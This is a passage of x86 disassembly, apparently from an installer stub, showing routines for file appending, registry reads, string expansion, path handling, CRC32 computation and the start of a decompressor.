  405796:	8b d8                	mov    %eax,%ebx
  405798:	a1 28 f0 42 00       	mov    0x42f028,%eax
  40579d:	83 c4 10             	add    $0x10,%esp
  4057a0:	ff b0 28 01 00 00    	push   0x128(%eax)
  4057a6:	56                   	push   %esi
  4057a7:	e8 1a 02 00 00       	call   0x4059c6
  4057ac:	6a 04                	push   $0x4
  4057ae:	68 00 00 00 c0       	push   $0xc0000000
  4057b3:	56                   	push   %esi
  4057b4:	e8 c7 fe ff ff       	call   0x405680
  4057b9:	8b e8                	mov    %eax,%ebp
  4057bb:	83 fd ff             	cmp    $0xffffffff,%ebp
  4057be:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4057c2:	0f 84 94 00 00 00    	je     0x40585c
  4057c8:	6a 00                	push   $0x0
  4057ca:	55                   	push   %ebp
  4057cb:	ff 15 90 70 40 00    	call   *0x407090
  4057d1:	8b f8                	mov    %eax,%edi
  4057d3:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  4057d7:	50                   	push   %eax
  4057d8:	6a 40                	push   $0x40
  4057da:	ff 15 f8 70 40 00    	call   *0x4070f8
  4057e0:	8b f0                	mov    %eax,%esi
  4057e2:	85 f6                	test   %esi,%esi
  4057e4:	74 6f                	je     0x405855
  4057e6:	8d 44 24 18          	lea    0x18(%esp),%eax
  4057ea:	6a 00                	push   $0x0
  4057ec:	50                   	push   %eax
  4057ed:	57                   	push   %edi
  4057ee:	56                   	push   %esi
  4057ef:	55                   	push   %ebp
  4057f0:	ff 15 2c 71 40 00    	call   *0x40712c
  4057f6:	85 c0                	test   %eax,%eax
  4057f8:	74 5b                	je     0x405855
  4057fa:	3b 7c 24 18          	cmp    0x18(%esp),%edi
  4057fe:	75 55                	jne    0x405855
  405800:	68 f8 92 40 00       	push   $0x4092f8
  405805:	56                   	push   %esi
  405806:	e8 ea fd ff ff       	call   0x4055f5
  40580b:	85 c0                	test   %eax,%eax
  40580d:	75 5a                	jne    0x405869
  40580f:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  405812:	68 f8 92 40 00       	push   $0x4092f8
  405817:	50                   	push   %eax
  405818:	e8 87 01 00 00       	call   0x4059a4
  40581d:	83 c7 0a             	add    $0xa,%edi
  405820:	8b c7                	mov    %edi,%eax
  405822:	53                   	push   %ebx
  405823:	03 c6                	add    %esi,%eax
  405825:	68 90 bc 42 00       	push   $0x42bc90
  40582a:	50                   	push   %eax
  40582b:	e8 11 fe ff ff       	call   0x405641
  405830:	33 c0                	xor    %eax,%eax
  405832:	50                   	push   %eax
  405833:	50                   	push   %eax
  405834:	50                   	push   %eax
  405835:	55                   	push   %ebp
  405836:	ff 15 30 71 40 00    	call   *0x407130
  40583c:	8d 44 24 18          	lea    0x18(%esp),%eax
  405840:	6a 00                	push   $0x0
  405842:	03 fb                	add    %ebx,%edi
  405844:	50                   	push   %eax
  405845:	57                   	push   %edi
  405846:	56                   	push   %esi
  405847:	55                   	push   %ebp
  405848:	ff 15 24 71 40 00    	call   *0x407124
  40584e:	56                   	push   %esi
  40584f:	ff 15 f4 70 40 00    	call   *0x4070f4
  405855:	55                   	push   %ebp
  405856:	ff 15 a4 70 40 00    	call   *0x4070a4
  40585c:	ff 05 b0 f0 42 00    	incl   0x42f0b0
  405862:	5f                   	pop    %edi
  405863:	5e                   	pop    %esi
  405864:	5d                   	pop    %ebp
  405865:	5b                   	pop    %ebx
  405866:	c2 08 00             	ret    $0x8
  405869:	83 c0 0a             	add    $0xa,%eax
  40586c:	68 f4 92 40 00       	push   $0x4092f4
  405871:	50                   	push   %eax
  405872:	e8 7e fd ff ff       	call   0x4055f5
  405877:	85 c0                	test   %eax,%eax
  405879:	74 a5                	je     0x405820
  40587b:	40                   	inc    %eax
  40587c:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  40587f:	3b c1                	cmp    %ecx,%eax
  405881:	8b e8                	mov    %eax,%ebp
  405883:	73 0b                	jae    0x405890
  405885:	8a 55 00             	mov    0x0(%ebp),%dl
  405888:	88 14 2b             	mov    %dl,(%ebx,%ebp,1)
  40588b:	45                   	inc    %ebp
  40588c:	3b e9                	cmp    %ecx,%ebp
  40588e:	72 f5                	jb     0x405885
  405890:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  405894:	2b c6                	sub    %esi,%eax
  405896:	eb 8a                	jmp    0x405822
  405898:	55                   	push   %ebp
  405899:	8b ec                	mov    %esp,%ebp
  40589b:	53                   	push   %ebx
  40589c:	8d 45 0c             	lea    0xc(%ebp),%eax
  40589f:	56                   	push   %esi
  4058a0:	8b 75 14             	mov    0x14(%ebp),%esi
  4058a3:	33 db                	xor    %ebx,%ebx
  4058a5:	50                   	push   %eax
  4058a6:	68 19 00 02 00       	push   $0x20019
  4058ab:	53                   	push   %ebx
  4058ac:	ff 75 0c             	push   0xc(%ebp)
  4058af:	88 1e                	mov    %bl,(%esi)
  4058b1:	ff 75 08             	push   0x8(%ebp)
  4058b4:	ff 15 10 70 40 00    	call   *0x407010
  4058ba:	85 c0                	test   %eax,%eax
  4058bc:	75 3e                	jne    0x4058fc
  4058be:	8d 45 08             	lea    0x8(%ebp),%eax
  4058c1:	c7 45 08 00 04 00 00 	movl   $0x400,0x8(%ebp)
  4058c8:	50                   	push   %eax
  4058c9:	8d 45 14             	lea    0x14(%ebp),%eax
  4058cc:	56                   	push   %esi
  4058cd:	50                   	push   %eax
  4058ce:	53                   	push   %ebx
  4058cf:	ff 75 10             	push   0x10(%ebp)
  4058d2:	ff 75 0c             	push   0xc(%ebp)
  4058d5:	ff 15 00 70 40 00    	call   *0x407000
  4058db:	85 c0                	test   %eax,%eax
  4058dd:	75 0c                	jne    0x4058eb
  4058df:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  4058e3:	74 08                	je     0x4058ed
  4058e5:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  4058e9:	74 02                	je     0x4058ed
  4058eb:	88 1e                	mov    %bl,(%esi)
  4058ed:	ff 75 0c             	push   0xc(%ebp)
  4058f0:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  4058f6:	ff 15 1c 70 40 00    	call   *0x40701c
  4058fc:	5e                   	pop    %esi
  4058fd:	5b                   	pop    %ebx
  4058fe:	5d                   	pop    %ebp
  4058ff:	c2 10 00             	ret    $0x10
  405902:	ff 74 24 08          	push   0x8(%esp)
  405906:	68 08 73 40 00       	push   $0x407308
  40590b:	ff 74 24 0c          	push   0xc(%esp)
  40590f:	ff 15 54 72 40 00    	call   *0x407254
  405915:	83 c4 0c             	add    $0xc,%esp
  405918:	c2 08 00             	ret    $0x8
  40591b:	55                   	push   %ebp
  40591c:	8b ec                	mov    %esp,%ebp
  40591e:	51                   	push   %ecx
  40591f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405922:	53                   	push   %ebx
  405923:	56                   	push   %esi
  405924:	57                   	push   %edi
  405925:	33 ff                	xor    %edi,%edi
  405927:	80 39 2d             	cmpb   $0x2d,(%ecx)
  40592a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405931:	b0 0a                	mov    $0xa,%al
  405933:	b3 39                	mov    $0x39,%bl
  405935:	75 05                	jne    0x40593c
  405937:	41                   	inc    %ecx
  405938:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40593c:	80 39 30             	cmpb   $0x30,(%ecx)
  40593f:	75 1c                	jne    0x40595d
  405941:	41                   	inc    %ecx
  405942:	8a 11                	mov    (%ecx),%dl
  405944:	80 fa 30             	cmp    $0x30,%dl
  405947:	7c 09                	jl     0x405952
  405949:	80 fa 37             	cmp    $0x37,%dl
  40594c:	7f 04                	jg     0x405952
  40594e:	b0 08                	mov    $0x8,%al
  405950:	b3 37                	mov    $0x37,%bl
  405952:	80 e2 df             	and    $0xdf,%dl
  405955:	80 fa 58             	cmp    $0x58,%dl
  405958:	75 03                	jne    0x40595d
  40595a:	b0 10                	mov    $0x10,%al
  40595c:	41                   	inc    %ecx
  40595d:	0f be 11             	movsbl (%ecx),%edx
  405960:	41                   	inc    %ecx
  405961:	83 fa 30             	cmp    $0x30,%edx
  405964:	7c 0c                	jl     0x405972
  405966:	0f be f3             	movsbl %bl,%esi
  405969:	3b d6                	cmp    %esi,%edx
  40596b:	7f 05                	jg     0x405972
  40596d:	83 ea 30             	sub    $0x30,%edx
  405970:	eb 19                	jmp    0x40598b
  405972:	3c 10                	cmp    $0x10,%al
  405974:	75 21                	jne    0x405997
  405976:	8b f2                	mov    %edx,%esi
  405978:	83 e6 df             	and    $0xffffffdf,%esi
  40597b:	83 fe 41             	cmp    $0x41,%esi
  40597e:	7c 17                	jl     0x405997
  405980:	83 fe 46             	cmp    $0x46,%esi
  405983:	7f 12                	jg     0x405997
  405985:	83 e2 07             	and    $0x7,%edx
  405988:	83 c2 09             	add    $0x9,%edx
  40598b:	0f be f0             	movsbl %al,%esi
  40598e:	0f af f7             	imul   %edi,%esi
  405991:	03 f2                	add    %edx,%esi
  405993:	8b fe                	mov    %esi,%edi
  405995:	eb c6                	jmp    0x40595d
  405997:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40599a:	0f af c7             	imul   %edi,%eax
  40599d:	5f                   	pop    %edi
  40599e:	5e                   	pop    %esi
  40599f:	5b                   	pop    %ebx
  4059a0:	c9                   	leave
  4059a1:	c2 04 00             	ret    $0x4
  4059a4:	68 00 04 00 00       	push   $0x400
  4059a9:	ff 74 24 0c          	push   0xc(%esp)
  4059ad:	ff 74 24 0c          	push   0xc(%esp)
  4059b1:	ff 15 b8 70 40 00    	call   *0x4070b8
  4059b7:	c2 08 00             	ret    $0x8
  4059ba:	ff 25 dc 70 40 00    	jmp    *0x4070dc
  4059c0:	ff 25 e0 70 40 00    	jmp    *0x4070e0
  4059c6:	55                   	push   %ebp
  4059c7:	8b ec                	mov    %esp,%ebp
  4059c9:	83 ec 14             	sub    $0x14,%esp
  4059cc:	53                   	push   %ebx
  4059cd:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4059d0:	56                   	push   %esi
  4059d1:	57                   	push   %edi
  4059d2:	85 db                	test   %ebx,%ebx
  4059d4:	7d 11                	jge    0x4059e7
  4059d6:	8b 0d fc e7 42 00    	mov    0x42e7fc,%ecx
  4059dc:	8d 04 9d 04 00 00 00 	lea    0x4(,%ebx,4),%eax
  4059e3:	2b c8                	sub    %eax,%ecx
  4059e5:	8b 19                	mov    (%ecx),%ebx
  4059e7:	a1 58 f0 42 00       	mov    0x42f058,%eax
  4059ec:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4059ef:	03 d8                	add    %eax,%ebx
  4059f1:	b8 c0 df 42 00       	mov    $0x42dfc0,%eax
  4059f6:	2b c8                	sub    %eax,%ecx
  4059f8:	8b f8                	mov    %eax,%edi
  4059fa:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  405a00:	0f 83 a7 01 00 00    	jae    0x405bad
  405a06:	8b 7d 08             	mov    0x8(%ebp),%edi
  405a09:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  405a0d:	e9 9b 01 00 00       	jmp    0x405bad
  405a12:	8b d7                	mov    %edi,%edx
  405a14:	2b d0                	sub    %eax,%edx
  405a16:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  405a1c:	0f 8d 98 01 00 00    	jge    0x405bba
  405a22:	43                   	inc    %ebx
  405a23:	80 f9 fc             	cmp    $0xfc,%cl
  405a26:	0f 86 74 01 00 00    	jbe    0x405ba0
  405a2c:	0f be 43 01          	movsbl 0x1(%ebx),%eax
  405a30:	0f be 0b             	movsbl (%ebx),%ecx
  405a33:	8b f0                	mov    %eax,%esi
  405a35:	8b d1                	mov    %ecx,%edx
  405a37:	83 e6 7f             	and    $0x7f,%esi
  405a3a:	83 e2 7f             	and    $0x7f,%edx
  405a3d:	c1 e6 07             	shl    $0x7,%esi
  405a40:	0b f2                	or     %edx,%esi
  405a42:	ba 00 80 00 00       	mov    $0x8000,%edx
  405a47:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405a4a:	0b c2                	or     %edx,%eax
  405a4c:	6a 02                	push   $0x2
  405a4e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405a51:	58                   	pop    %eax
  405a52:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  405a55:	0b ca                	or     %edx,%ecx
  405a57:	03 d8                	add    %eax,%ebx
  405a59:	80 7d 0f fe          	cmpb   $0xfe,0xf(%ebp)
  405a5d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405a60:	0f 85 e5 00 00 00    	jne    0x405b4b
  405a66:	83 3d a4 f0 42 00 00 	cmpl   $0x0,0x42f0a4
  405a6d:	89 45 0c             	mov    %eax,0xc(%ebp)
  405a70:	74 07                	je     0x405a79
  405a72:	c7 45 0c 04 00 00 00 	movl   $0x4,0xc(%ebp)
  405a79:	ff 4d 0c             	decl   0xc(%ebp)
  405a7c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405a7f:	50                   	push   %eax
  405a80:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a83:	ff 74 85 ec          	push   -0x14(%ebp,%eax,4)
  405a87:	ff 35 24 f0 42 00    	push   0x42f024
  405a8d:	ff 15 60 71 40 00    	call   *0x407160
  405a93:	85 c0                	test   %eax,%eax
  405a95:	75 19                	jne    0x405ab0
  405a97:	57                   	push   %edi
  405a98:	ff 75 fc             	push   -0x4(%ebp)
  405a9b:	ff 15 4c 71 40 00    	call   *0x40714c
  405aa1:	ff 75 fc             	push   -0x4(%ebp)
  405aa4:	8b f0                	mov    %eax,%esi
  405aa6:	ff 15 6c 72 40 00    	call   *0x40726c
  405aac:	85 f6                	test   %esi,%esi
  405aae:	75 09                	jne    0x405ab9
  405ab0:	80 27 00             	andb   $0x0,(%edi)
  405ab3:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  405ab7:	75 c0                	jne    0x405a79
  405ab9:	80 3f 00             	cmpb   $0x0,(%edi)
  405abc:	75 74                	jne    0x405b32
  405abe:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405ac1:	83 f8 2b             	cmp    $0x2b,%eax
  405ac4:	75 17                	jne    0x405add
  405ac6:	57                   	push   %edi
  405ac7:	68 94 93 40 00       	push   $0x409394
  405acc:	68 68 93 40 00       	push   $0x409368
  405ad1:	68 02 00 00 80       	push   $0x80000002
  405ad6:	e8 bd fd ff ff       	call   0x405898
  405adb:	eb 50                	jmp    0x405b2d
  405add:	83 f8 26             	cmp    $0x26,%eax
  405ae0:	75 27                	jne    0x405b09
  405ae2:	57                   	push   %edi
  405ae3:	68 58 93 40 00       	push   $0x409358
  405ae8:	68 68 93 40 00       	push   $0x409368
  405aed:	68 02 00 00 80       	push   $0x80000002
  405af2:	e8 a1 fd ff ff       	call   0x405898
  405af7:	80 3f 00             	cmpb   $0x0,(%edi)
  405afa:	75 36                	jne    0x405b32
  405afc:	68 44 93 40 00       	push   $0x409344
  405b01:	57                   	push   %edi
  405b02:	e8 9d fe ff ff       	call   0x4059a4
  405b07:	eb 24                	jmp    0x405b2d
  405b09:	83 f8 25             	cmp    $0x25,%eax
  405b0c:	75 0e                	jne    0x405b1c
  405b0e:	68 00 04 00 00       	push   $0x400
  405b13:	57                   	push   %edi
  405b14:	ff 15 e4 70 40 00    	call   *0x4070e4
  405b1a:	eb 11                	jmp    0x405b2d
  405b1c:	83 f8 24             	cmp    $0x24,%eax
  405b1f:	75 0c                	jne    0x405b2d
  405b21:	68 00 04 00 00       	push   $0x400
  405b26:	57                   	push   %edi
  405b27:	ff 15 a8 70 40 00    	call   *0x4070a8
  405b2d:	80 3f 00             	cmpb   $0x0,(%edi)
  405b30:	74 11                	je     0x405b43
  405b32:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  405b36:	75 0b                	jne    0x405b43
  405b38:	68 18 93 40 00       	push   $0x409318
  405b3d:	57                   	push   %edi
  405b3e:	e8 7d fe ff ff       	call   0x4059c0
  405b43:	57                   	push   %edi
  405b44:	e8 8a 00 00 00       	call   0x405bd3
  405b49:	eb 46                	jmp    0x405b91
  405b4b:	80 7d 0f fd          	cmpb   $0xfd,0xf(%ebp)
  405b4f:	75 2e                	jne    0x405b7f
  405b51:	83 fe 1b             	cmp    $0x1b,%esi
  405b54:	75 0e                	jne    0x405b64
  405b56:	ff 35 24 f0 42 00    	push   0x42f024
  405b5c:	57                   	push   %edi
  405b5d:	e8 a0 fd ff ff       	call   0x405902
  405b62:	eb 11                	jmp    0x405b75
  405b64:	8b c6                	mov    %esi,%eax
  405b66:	c1 e0 0a             	shl    $0xa,%eax
  405b69:	05 00 00 43 00       	add    $0x430000,%eax
  405b6e:	50                   	push   %eax
  405b6f:	57                   	push   %edi
  405b70:	e8 2f fe ff ff       	call   0x4059a4
  405b75:	83 c6 eb             	add    $0xffffffeb,%esi
  405b78:	83 fe 06             	cmp    $0x6,%esi
  405b7b:	73 14                	jae    0x405b91
  405b7d:	eb c4                	jmp    0x405b43
  405b7f:	80 7d 0f ff          	cmpb   $0xff,0xf(%ebp)
  405b83:	75 0c                	jne    0x405b91
  405b85:	83 c8 ff             	or     $0xffffffff,%eax
  405b88:	2b c6                	sub    %esi,%eax
  405b8a:	50                   	push   %eax
  405b8b:	57                   	push   %edi
  405b8c:	e8 35 fe ff ff       	call   0x4059c6
  405b91:	57                   	push   %edi
  405b92:	e8 23 fe ff ff       	call   0x4059ba
  405b97:	03 f8                	add    %eax,%edi
  405b99:	b8 c0 df 42 00       	mov    $0x42dfc0,%eax
  405b9e:	eb 0d                	jmp    0x405bad
  405ba0:	75 08                	jne    0x405baa
  405ba2:	8a 0b                	mov    (%ebx),%cl
  405ba4:	88 0f                	mov    %cl,(%edi)
  405ba6:	47                   	inc    %edi
  405ba7:	43                   	inc    %ebx
  405ba8:	eb 03                	jmp    0x405bad
  405baa:	88 0f                	mov    %cl,(%edi)
  405bac:	47                   	inc    %edi
  405bad:	8a 0b                	mov    (%ebx),%cl
  405baf:	84 c9                	test   %cl,%cl
  405bb1:	88 4d 0f             	mov    %cl,0xf(%ebp)
  405bb4:	0f 85 58 fe ff ff    	jne    0x405a12
  405bba:	80 27 00             	andb   $0x0,(%edi)
  405bbd:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405bc1:	5f                   	pop    %edi
  405bc2:	5e                   	pop    %esi
  405bc3:	5b                   	pop    %ebx
  405bc4:	74 09                	je     0x405bcf
  405bc6:	50                   	push   %eax
  405bc7:	ff 75 08             	push   0x8(%ebp)
  405bca:	e8 d5 fd ff ff       	call   0x4059a4
  405bcf:	c9                   	leave
  405bd0:	c2 08 00             	ret    $0x8
  405bd3:	53                   	push   %ebx
  405bd4:	56                   	push   %esi
  405bd5:	8b 74 24 0c          	mov    0xc(%esp),%esi
  405bd9:	57                   	push   %edi
  405bda:	80 3e 5c             	cmpb   $0x5c,(%esi)
  405bdd:	75 15                	jne    0x405bf4
  405bdf:	80 7e 01 5c          	cmpb   $0x5c,0x1(%esi)
  405be3:	75 0f                	jne    0x405bf4
  405be5:	80 7e 02 3f          	cmpb   $0x3f,0x2(%esi)
  405be9:	75 09                	jne    0x405bf4
  405beb:	80 7e 03 5c          	cmpb   $0x5c,0x3(%esi)
  405bef:	75 03                	jne    0x405bf4
  405bf1:	83 c6 04             	add    $0x4,%esi
  405bf4:	80 3e 00             	cmpb   $0x0,(%esi)
  405bf7:	74 0c                	je     0x405c05
  405bf9:	56                   	push   %esi
  405bfa:	e8 0a f9 ff ff       	call   0x405509
  405bff:	85 c0                	test   %eax,%eax
  405c01:	74 02                	je     0x405c05
  405c03:	46                   	inc    %esi
  405c04:	46                   	inc    %esi
  405c05:	8a 06                	mov    (%esi),%al
  405c07:	8b de                	mov    %esi,%ebx
  405c09:	84 c0                	test   %al,%al
  405c0b:	8b fe                	mov    %esi,%edi
  405c0d:	74 39                	je     0x405c48
  405c0f:	55                   	push   %ebp
  405c10:	8b 2d 10 72 40 00    	mov    0x407210,%ebp
  405c16:	3c 1f                	cmp    $0x1f,%al
  405c18:	76 22                	jbe    0x405c3c
  405c1a:	50                   	push   %eax
  405c1b:	68 a4 93 40 00       	push   $0x4093a4
  405c20:	e8 a3 f8 ff ff       	call   0x4054c8
  405c25:	80 38 00             	cmpb   $0x0,(%eax)
  405c28:	75 12                	jne    0x405c3c
  405c2a:	56                   	push   %esi
  405c2b:	ff d5                	call   *%ebp
  405c2d:	2b c6                	sub    %esi,%eax
  405c2f:	50                   	push   %eax
  405c30:	56                   	push   %esi
  405c31:	57                   	push   %edi
  405c32:	e8 0a fa ff ff       	call   0x405641
  405c37:	57                   	push   %edi
  405c38:	ff d5                	call   *%ebp
  405c3a:	8b f8                	mov    %eax,%edi
  405c3c:	56                   	push   %esi
  405c3d:	ff d5                	call   *%ebp
  405c3f:	8b f0                	mov    %eax,%esi
  405c41:	8a 06                	mov    (%esi),%al
  405c43:	84 c0                	test   %al,%al
  405c45:	75 cf                	jne    0x405c16
  405c47:	5d                   	pop    %ebp
  405c48:	80 27 00             	andb   $0x0,(%edi)
  405c4b:	57                   	push   %edi
  405c4c:	53                   	push   %ebx
  405c4d:	ff 15 d0 71 40 00    	call   *0x4071d0
  405c53:	8b f8                	mov    %eax,%edi
  405c55:	8a 07                	mov    (%edi),%al
  405c57:	3c 20                	cmp    $0x20,%al
  405c59:	74 04                	je     0x405c5f
  405c5b:	3c 5c                	cmp    $0x5c,%al
  405c5d:	75 07                	jne    0x405c66
  405c5f:	80 27 00             	andb   $0x0,(%edi)
  405c62:	3b df                	cmp    %edi,%ebx
  405c64:	72 e5                	jb     0x405c4b
  405c66:	5f                   	pop    %edi
  405c67:	5e                   	pop    %esi
  405c68:	5b                   	pop    %ebx
  405c69:	c2 04 00             	ret    $0x4
  405c6c:	53                   	push   %ebx
  405c6d:	56                   	push   %esi
  405c6e:	8b 35 04 71 40 00    	mov    0x407104,%esi
  405c74:	57                   	push   %edi
  405c75:	68 01 80 00 00       	push   $0x8001
  405c7a:	ff d6                	call   *%esi
  405c7c:	bf d8 c4 42 00       	mov    $0x42c4d8,%edi
  405c81:	57                   	push   %edi
  405c82:	ff 74 24 14          	push   0x14(%esp)
  405c86:	ff 15 3c 71 40 00    	call   *0x40713c
  405c8c:	6a 00                	push   $0x0
  405c8e:	8b d8                	mov    %eax,%ebx
  405c90:	ff d6                	call   *%esi
  405c92:	83 fb ff             	cmp    $0xffffffff,%ebx
  405c95:	74 0b                	je     0x405ca2
  405c97:	53                   	push   %ebx
  405c98:	ff 15 34 71 40 00    	call   *0x407134
  405c9e:	8b c7                	mov    %edi,%eax
  405ca0:	eb 02                	jmp    0x405ca4
  405ca2:	33 c0                	xor    %eax,%eax
  405ca4:	5f                   	pop    %edi
  405ca5:	5e                   	pop    %esi
  405ca6:	5b                   	pop    %ebx
  405ca7:	c2 04 00             	ret    $0x4
  405caa:	ff 74 24 04          	push   0x4(%esp)
  405cae:	ff 15 08 71 40 00    	call   *0x407108
  405cb4:	85 c0                	test   %eax,%eax
  405cb6:	75 0e                	jne    0x405cc6
  405cb8:	ff 74 24 04          	push   0x4(%esp)
  405cbc:	ff 15 b4 70 40 00    	call   *0x4070b4
  405cc2:	85 c0                	test   %eax,%eax
  405cc4:	74 0b                	je     0x405cd1
  405cc6:	ff 74 24 08          	push   0x8(%esp)
  405cca:	50                   	push   %eax
  405ccb:	ff 15 10 71 40 00    	call   *0x407110
  405cd1:	c2 08 00             	ret    $0x8
  405cd4:	55                   	push   %ebp
  405cd5:	8b ec                	mov    %esp,%ebp
  405cd7:	83 ec 1c             	sub    $0x1c,%esp
  405cda:	56                   	push   %esi
  405cdb:	8b 75 08             	mov    0x8(%ebp),%esi
  405cde:	57                   	push   %edi
  405cdf:	8b 3d d8 71 40 00    	mov    0x4071d8,%edi
  405ce5:	eb 0a                	jmp    0x405cf1
  405ce7:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405cea:	50                   	push   %eax
  405ceb:	ff 15 d4 71 40 00    	call   *0x4071d4
  405cf1:	6a 01                	push   $0x1
  405cf3:	56                   	push   %esi
  405cf4:	56                   	push   %esi
  405cf5:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405cf8:	6a 00                	push   $0x0
  405cfa:	50                   	push   %eax
  405cfb:	ff d7                	call   *%edi
  405cfd:	85 c0                	test   %eax,%eax
  405cff:	75 e6                	jne    0x405ce7
  405d01:	5f                   	pop    %edi
  405d02:	5e                   	pop    %esi
  405d03:	c9                   	leave
  405d04:	c2 04 00             	ret    $0x4
  405d07:	83 3d 1c ca 42 00 00 	cmpl   $0x0,0x42ca1c
  405d0e:	56                   	push   %esi
  405d0f:	75 2d                	jne    0x405d3e
  405d11:	33 c9                	xor    %ecx,%ecx
  405d13:	6a 08                	push   $0x8
  405d15:	8b c1                	mov    %ecx,%eax
  405d17:	5e                   	pop    %esi
  405d18:	8b d0                	mov    %eax,%edx
  405d1a:	80 e2 01             	and    $0x1,%dl
  405d1d:	f6 da                	neg    %dl
  405d1f:	1b d2                	sbb    %edx,%edx
  405d21:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  405d27:	d1 e8                	shr    $1,%eax
  405d29:	33 c2                	xor    %edx,%eax
  405d2b:	4e                   	dec    %esi
  405d2c:	75 ea                	jne    0x405d18
  405d2e:	89 04 8d 18 ca 42 00 	mov    %eax,0x42ca18(,%ecx,4)
  405d35:	41                   	inc    %ecx
  405d36:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  405d3c:	7c d5                	jl     0x405d13
  405d3e:	8b 54 24 10          	mov    0x10(%esp),%edx
  405d42:	8b 44 24 08          	mov    0x8(%esp),%eax
  405d46:	85 d2                	test   %edx,%edx
  405d48:	f7 d0                	not    %eax
  405d4a:	76 23                	jbe    0x405d6f
  405d4c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  405d50:	57                   	push   %edi
  405d51:	0f b6 39             	movzbl (%ecx),%edi
  405d54:	8b f0                	mov    %eax,%esi
  405d56:	81 e6 ff 00 00 00    	and    $0xff,%esi
  405d5c:	33 f7                	xor    %edi,%esi
  405d5e:	c1 e8 08             	shr    $0x8,%eax
  405d61:	8b 34 b5 18 ca 42 00 	mov    0x42ca18(,%esi,4),%esi
  405d68:	33 c6                	xor    %esi,%eax
  405d6a:	41                   	inc    %ecx
  405d6b:	4a                   	dec    %edx
  405d6c:	75 e3                	jne    0x405d51
  405d6e:	5f                   	pop    %edi
  405d6f:	f7 d0                	not    %eax
  405d71:	5e                   	pop    %esi
  405d72:	c2 0c 00             	ret    $0xc
  405d75:	55                   	push   %ebp
  405d76:	8b ec                	mov    %esp,%ebp
  405d78:	83 ec 44             	sub    $0x44,%esp
  405d7b:	8b 45 08             	mov    0x8(%ebp),%eax
  405d7e:	53                   	push   %ebx
  405d7f:	56                   	push   %esi
  405d80:	57                   	push   %edi
  405d81:	8b 08                	mov    (%eax),%ecx
  405d83:	8d 70 10             	lea    0x10(%eax),%esi
  405d86:	8b 40 04             	mov    0x4(%eax),%eax
  405d89:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  405d8c:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  405d92:	8b 9e 18 05 00 00    	mov    0x518(%esi),%ebx
  405d98:	89 45 cc             	mov    %eax,-0x34(%ebp)
  405d9b:	8b 86 1c 05 00 00    	mov    0x51c(%esi),%eax
  405da1:	89 45 c0             	mov    %eax,-0x40(%ebp)
  405da4:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  405daa:	3b c8                	cmp    %eax,%ecx
  405dac:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  405daf:	73 05                	jae    0x405db6
  405db1:	2b c1                	sub    %ecx,%eax
  405db3:	48                   	dec    %eax
  405db4:	eb 08                	jmp    0x405dbe
  405db6:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  405dbc:	2b c1                	sub    %ecx,%eax
  405dbe:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405dc1:	e9 c3 09 00 00       	jmp    0x406789
  405dc6:	ff 24 85 c4 67 40 00 	jmp    *0x4067c4(,%eax,4)
  405dcd:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  405dd1:	0f 84 c2 09 00 00    	je     0x406799
  405dd7:	8b 45 c8             	mov    -0x38(%ebp),%eax
  405dda:	ff 4d cc             	decl   -0x34(%ebp)
  405ddd:	8b cb                	mov    %ebx,%ecx
  405ddf:	0f b6 00             	movzbl (%eax),%eax
  405de2:	d3 e0                	shl    %cl,%eax
  405de4:	09 45 c0             	or     %eax,-0x40(%ebp)
  405de7:	ff 45 c8             	incl   -0x38(%ebp)
  405dea:	83 c3 08             	add    $0x8,%ebx
  405ded:	83 fb 03             	cmp    $0x3,%ebx
  405df0:	72 db                	jb     0x405dcd
  405df2:	8b 45 c0             	mov    -0x40(%ebp),%eax
  405df5:	83 eb 03             	sub    $0x3,%ebx
  405df8:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  405dfc:	83 e0 07             	and    $0x7,%eax
  405dff:	8b c8                	mov    %eax,%ecx
  405e01:	80 e1 01             	and    $0x1,%cl
  405e04:	f6 d9                	neg    %cl
  405e06:	1b c9                	sbb    %ecx,%ecx
  405e08:	83 e1 07             	and    $0x7,%ecx
  405e0b:	d1 e8                	shr    $1,%eax
  405e0d:	83 c1 08             	add    $0x8,%ecx
  405e10:	83 e8 00             	sub    $0x0,%eax
  405e13:	89 8e 14 05 00 00    	mov    %ecx,0x514(%esi)
  405e19:	0f 84 2e 01 00 00    	je     0x405f4d
  405e1f:	48                   	dec    %eax
  405e20:	74 56                	je     0x405e78
  405e22:	48                   	dec    %eax
